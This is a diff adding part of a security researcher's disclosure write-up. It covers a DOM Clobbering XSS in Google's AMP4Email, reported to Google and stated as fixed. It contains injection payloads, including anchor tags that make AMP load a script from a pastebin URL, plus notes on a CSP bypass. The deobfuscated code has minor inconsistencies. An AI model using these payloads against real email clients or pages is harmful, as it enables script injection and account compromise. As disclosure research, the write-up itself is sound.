@@ -113,4 +113,213 @@ What is particularly interesting here (and that can be spotted in fig. 4) is tha
 <a id=test1>click!</a>
 <a id=test1 name=test2>click2!</a>
 ```
-And we can access the second anchor element via window.test1.test2.
+And we can access the second anchor element via `window.test1.test2`.
+
+![Mc53RA.png](https://s2.ax1x.com/2019/11/19/Mc53RA.png)
+Fig 5. We can make window.test1.test2 defined
+
+So going back to the original exercise of exploiting `eval(''+window.test1.test2)` via DOM Clobbering, the solution would be:
+
+```javascript
+<a id="test1"></a><a id="test1" name="test2" href="x:alert(1)"></a>
+```
+
+Let’s now go back to AMP4Email to see how DOM Clobbering could be exploited in a real-world case.
+
+## Exploiting DOM Clobbering in AMP4Email
+
+I’ve already mentioned that AMP4Email could be vulnerable to DOM Clobbering by adding my own id attributes to elements. To find some exploitable condition, I decided to have a look at properties of `window` (Fig 6). The ones that immediately caught attention were beginning with AMP.
+
+![Mc5DRs.png](https://s2.ax1x.com/2019/11/19/Mc5DRs.png)
+
+Fig 6. Properties of window global object
+
+At this point, it turned out that AMP4Email actually employs some protection against DOM Clobbering because it strictly forbids certain values for id attribute, for instance: `AMP` (Fig 7.).
+
+![Mc56s0.png](https://s2.ax1x.com/2019/11/19/Mc56s0.png)
+
+Fig 7. AMP is an invalid value for id in AMP4Email
+
+The same restriction didn’t happen with AMP_MODE, though. So I prepared a code `<a id=AMP_MODE>` just to see what happens…
+
+… and then I noticed a very interesting error in the console (Fig 8).
+
+![Mc5WoF.png](https://s2.ax1x.com/2019/11/19/Mc5WoF.png)
+
+Fig 8. 404 on loading certain JS file
+
+As seen in fig 8., AMP4Email tries to load certain JS file and fails to do so because of 404. What is particularly eye-catching, however, is the fact that there’s `undefined` in the middle of the URL
+
+(https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.js). There was just one plausible explanation why this happens I could come up with: AMP tries to get a property of `AMP_MODE` to put it in the URL. Because of DOM Clobbering, the expected property is missing, hence `undefined`. The code responsible for the code inclusion is shown below:
+
+```javascript
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+f.preloadExtension = function(a, b) {
+            "amp-embed" == a && (a = "amp-ad");
+            var c = fn(this, a, !1);
+            if (c.loaded || c.error)
+                var d = !1;
+            else
+                void 0 === c.scriptPresent && (d = this.win.document.head.querySelector('[custom-element="' + a + '"]'),
+                c.scriptPresent = !!d),
+                d = !c.scriptPresent;
+            if (d) {
+                d = b;
+                b = this.win.document.createElement("script");
+                b.async = !0;
+                yb(a, "_") ? d = "" : b.setAttribute(0 <= dn.indexOf(a) ? "custom-template" : "custom-element", a);
+                b.setAttribute("data-script", a);
+                b.setAttribute("i-amphtml-inserted", "");
+                var e = this.win.location;
+                t().test && this.win.testLocation && (e = this.win.testLocation);
+                if (t().localDev) {
+                    var g = e.protocol + "//" + e.host;
+                    "about:" == e.protocol && (g = "");
+                    e = g + "/dist"
+                } else
+                    e = hd.cdn;
+                g = t().rtvVersion;
+                null == d && (d = "0.1");
+                d = d ? "-" + d : "";
+                var h = t().singlePassType ? t().singlePassType + "/" : "";
+                b.src = e + "/rtv/" + g + "/" + h + "v0/" + a + d + ".js";
+                this.win.document.head.appendChild(b);
+                c.scriptPresent = !0
+            }
+            return gn(c)
+        }
+```
+
+While it is not particularly difficult to read, below is shown a manually deobfuscated form of the code (with some parts being omitted for clarity):
+
+```javascript
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+var script = window.document.createElement("script");
+script.async = false;
+ 
+var loc;
+if (AMP_MODE.test && window.testLocation) {
+    loc = window.testLocation
+} else {
+    loc = window.location;
+}
+ 
+if (AMP_MODE.localDev) {
+    loc = loc.protocol + "//" + loc.host + "/dist"
+} else {
+    loc = "https://cdn.ampproject.org";
+}
+ 
+var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
+b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";
+ 
+document.head.appendChild(b);
+```
+
+So, in line 1, the code creates a new `script` element. Then, checks whether `AMP_MODE.test` and `window.testLocation` are both truthy. If they are, and also `AMP_MODE.localDev` is truthy (line 11), then `window.testLocation` is being used as a base for generating the URL of the script. Then, in lines 17 and 18 some other properties are concatenated to form the full URL. While it may not be obvious at the first sight, because of how the code is written and thanks to DOM Clobbering, we can actually control the full URL. Let’s assume that `AMP_MODE.localDev` and `AMP_MODE.test` are truthy, to see how the code simplifies even more:
+
+```javascript
+var script = window.document.createElement("script");
+script.async = false;
+ 
+b.src = window.testLocation.protocol + "//" + 
+        window.testLocation.host + "/dist/rtv/" + 
+        AMP_MODE.rtvVersion; + "/" + 
+        (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "") + 
+        "v0/" + pluginName + ".js";
+ 
+document.head.appendChild(b);
+````
+
+Do you remember our earlier exercise of overloading `window.test1.test2` with DOM Clobbering? Now we need to do the same, only overload `window.testLocation.protocol`. Hence the final payload:
+
+```javascript
+<!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy-->
+<a id="AMP_MODE"></a>
+<a id="AMP_MODE" name="localDev"></a>
+<a id="AMP_MODE" name="test"></a>
+
+<!-- window.testLocation.protocol is a base for the URL -->
+<a id="testLocation"></a>
+<a id="testLocation" name="protocol" 
+   href="https://pastebin.com/raw/0tn8z0rG#"></a>
+```
+
+Actually, the code didn’t execute in the real-world case because of Content-Security-Policy deployed in AMP:
+
+```javascript
+Content-Security-Policy: default-src 'none'; 
+script-src 'sha512-oQwIl...==' 
+  https://cdn.ampproject.org/rtv/ 
+  https://cdn.ampproject.org/v0.js 
+  https://cdn.ampproject.org/v0/
+```
+
+I didn’t find a way to bypass the CSP, but when trying to do so, I found an interesting way of bypassing dir-based CSP and [I tweeted about it](https://twitter.com/SecurityMB/status/1162690916722839552) (later it turned out that [the same trick was already used in a CTF in 2016](https://blog.0daylabs.com/2016/09/09/bypassing-csp/)). Google in their bug bounty program, don’t actually expect bypassing CSP and pay a full bounty anyway. It was still an interesting challenge; maybe someone else will find way to bypass 🙂
+
+## Summary
+
+In the post, I’ve shown how DOM Clobbering could be used to perform an XSS if certain conditions are met. It was surely an interesting ride! If you wish to play around with these kind of XSS-es, have a look at my XSS Challenge, which was based on this very XSS.
+
+### Timeline:
+
+* 15th Aug 2019 – sending report to Google
+* 16th Aug 2019 – “nice catch!”,
+* 10th Sep 2019 – response from Google: “the bug is awesome, thanks for reporting!”,
+* 12th Oct 2019 – confirmation from Google that the bug is fixed (although in reality it happened way earlier),
+* 18th Nov 2019 – publication.
+Author: Michał Bentkowski
